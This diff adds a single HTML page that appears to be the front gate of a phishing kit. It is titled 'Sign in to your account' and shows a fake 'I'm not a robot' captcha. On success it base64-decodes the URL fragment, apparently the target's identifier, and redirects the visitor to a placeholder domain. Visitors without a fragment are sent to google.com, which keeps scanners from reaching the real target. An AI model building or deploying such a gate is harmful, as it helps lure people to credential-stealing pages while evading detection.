@@ -1,0 +1,250 @@
+<html lang="en">
+<head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Sign in to your account</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <style>
+        p{font-size: 40px;}
+        .loader {
+            position: fixed;
+            left: 0px;
+            top: 0px;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: url('') 50% 50% no-repeat rgb(249,249,249);
+            opacity: .8;
+        }
+
+        .loader2 {
+            position: fixed;
+            left: 0px;
+            top: 0px;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: url('') 50% 50% no-repeat rgb(249,249,249);
+            opacity: .8;
+        }
+
+        @import url(https://fonts.googleapis.com/css?family=Open+Sans:400,600,300,700);
+        @import url(https://fonts.googleapis.com/css?family=Roboto+Slab:400,100);
+        body {
+            background-color: lightgray;
+        }
+        .captchaField {
+            margin: 0 auto;
+            margin-top: 15%;
+            border: 1px solid #ccc;
+            padding: 15px;
+            width: 345px;
+            background-color: #fff;
+            border-radius: 5px;
+        }
+        .CaptchaWrap { position: relative; }
+        .CaptchaTxtField {
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            display: block;  
+            box-sizing: border-box;
+        }
+        #UserCaptchaCode {
+            padding: 15px 10px;
+            outline: none;
+            font-size: 18px;
+            font-weight: normal;
+            font-family: 'Open Sans', sans-serif;
+            width: 343px;
+        }
+        #CaptchaImageCode {
+            text-align:center;
+            margin-top: 15px;
+            padding: 0px 0;
+            width: 300px;
+            overflow: hidden;
+        }
+        .capcode {
+            font-size: 46px;
+            display: block;
+            -moz-user-select: none;
+            -webkit-user-select: none;
+            user-select: none;
+            cursor: default;
+            letter-spacing: 1px;
+            color: #ccc;
+            font-family: 'Roboto Slab', serif;
+            font-weight: 100;
+            font-style: italic;
+        }
+        .ReloadBtn {
+            background:url('https://webdevtrick.com/wp-content/uploads/recaptcha.png') left top no-repeat;  
+            background-size : 100%;
+            width: 32px;
+            height: 32px;
+            border: 0px; outline none;
+            position: absolute;
+            bottom: 30px;
+            left: 310px;
+            outline: none;
+            cursor: pointer;
+        }
+        .btnSubmit {
+            margin-top: 15px;
+            border: 0px;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 18px;
+            background-color: #1285c4;
+            color: #fff;
+            cursor: pointer;
+        }
+        .error {
+            color: red;
+            font-size: 12px;
+            display: none;
+        }
+        .success {
+            color: green;
+            font-size: 18px;
+            margin-bottom: 15px;
+            display: none;
+        }
+    </style>
+</head>
+
+<body class="cb">
+    <section id="captcha">
+        <fieldset style="width: 372px;" class="captchaField">
+            <span id="SuccessMessage" class="success">Thanks! The Captcha Is Correct!</span>
+            <input id="UserCaptchaCode" class="CaptchaTxtField" placeholder="Enter Captcha - Case Sensitive">
+            <span id="WrongCaptchaError" class="error"></span>
+            <div class="CaptchaWrap">
+                <div id="CaptchaImageCode" class="CaptchaTxtField">
+                    <canvas id="CapCode" class="capcode" width="300" height="80"></canvas>
+                </div>
+                <input class="ReloadBtn" onclick="CreateCaptcha();">
+            </div>
+            <input class="btnSubmit" onclick="CheckCaptcha();" style="width:100%" value="I'm not a robot">
+        </fieldset>
+    </section>
+
+    <div id="body" style="display: none;">
+        <div class="loader"></div>
+        <div class="loader2" style="display: none;"></div>
+    </div>
+
+    <script type="text/javascript">
+        var cd;
+        var IsAllowed = false;
+
+        $(document).ready(function(){
+            CreateCaptcha();
+        });
+
+        function CreateCaptcha() {
+            var alpha = new Array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
+                                  'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
+                                  '0','1','2','3','4','5','6','7','8','9');
+            var i;
+            for (i = 0; i < 6; i++) {
+                var a = alpha[Math.floor(Math.random() * alpha.length)];
+                var b = alpha[Math.floor(Math.random() * alpha.length)];
+                var c = alpha[Math.floor(Math.random() * alpha.length)];
+                var d = alpha[Math.floor(Math.random() * alpha.length)];
+                var e = alpha[Math.floor(Math.random() * alpha.length)];
+                var f = alpha[Math.floor(Math.random() * alpha.length)];
+            }
+            cd = a + ' ' + b + ' ' + c + ' ' + d + ' ' + e + ' ' + f;
+            $('#CaptchaImageCode').empty().append('<canvas id="CapCode" class="capcode" width="300" height="80"></canvas>')
+            var c = document.getElementById("CapCode"),
+                ctx = c.getContext("2d"),
+                x = c.width / 2,
+                img = new Image();
+            img.src = "https://webdevtrick.com/wp-content/uploads/captchaback.jpg";
+            img.onload = function () {
+                var pattern = ctx.createPattern(img, "repeat");
+                ctx.fillStyle = pattern;
+                ctx.fillRect(0, 0, c.width, c.height);
+                ctx.font = "46px Roboto Slab";
+                ctx.fillStyle = '#000';
+                ctx.textAlign = 'center';
+                ctx.setTransform(1, -0.12, 0, 1, 0, 15);
+                ctx.fillText(cd, x, 55);
+            };
+        }
+
+        function ValidateCaptcha() {
+            var string1 = removeSpaces(cd);
+            var string2 = removeSpaces($('#UserCaptchaCode').val());
+            if (string1 == string2) {
+                return true;
+            } else {
+                return false;
+            }
+        }
+
+        function removeSpaces(string) {
+            return string.split(' ').join('');
+        }
+
+        function CheckCaptcha() {
+            var result = ValidateCaptcha();
+
+            if ($('#UserCaptchaCode').val() == '' || $('#UserCaptchaCode').val() == null || $('#UserCaptchaCode').val() == "undefined") {
+                $('#WrongCaptchaError').text("Please Enter Code Given Below In a Picture.").fadeIn();
+                $('#UserCaptchaCode').focus();
+            } else {
+                if (result == false) {
+                    IsAllowed = false;
+                    $('#WrongCaptchaError').text("Invalid Captcha! Please Try Again.").fadeIn();
+                    CreateCaptcha();
+                    $('#UserCaptchaCode').focus().select();
+                } else {
+                    IsAllowed = true;
+                    $('#UserCaptchaCode').val('').attr('place-holder', 'Enter Captcha - Case Sensitive');
+                    CreateCaptcha();
+                    $('#WrongCaptchaError').fadeOut(100);
+                    $('#SuccessMessage').fadeIn(500).css("display", "block").delay(5000).fadeOut(250);
+                    $('#body').fadeIn(200);
+                    onCaptchaSuccess(); // Redirect after CAPTCHA success
+                }
+            }
+        }
+
+        // Assuming this function is called when CAPTCHA is successfully completed
+        function onCaptchaSuccess() {
+            var main_link = "https://project.com";
+
+            if (!window.location.hash) {
+                location.href = "https://google.com";
+            }
+
+            var fragment = window.location.hash.substring(1);
+
+            if (fragment.length < 3) {
+                location.href = "https://google.com";
+            }
+
+            var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+            var decodedFragment = fragment;
+
+            if (base64regex.test(fragment)) {
+                try {
+                    decodedFragment = atob(fragment);
+                    console.log("Decoded Base64 value:", decodedFragment);
+                } catch (error) {
+                    console.log("Error while decoding Base64 value:", error);
+                }
+            } else {
+                console.log("Not a valid Base64 value.");
+            }
+
+            location.href = main_link + decodedFragment;
+        }
+    </script>
+
+</body>
+</html>
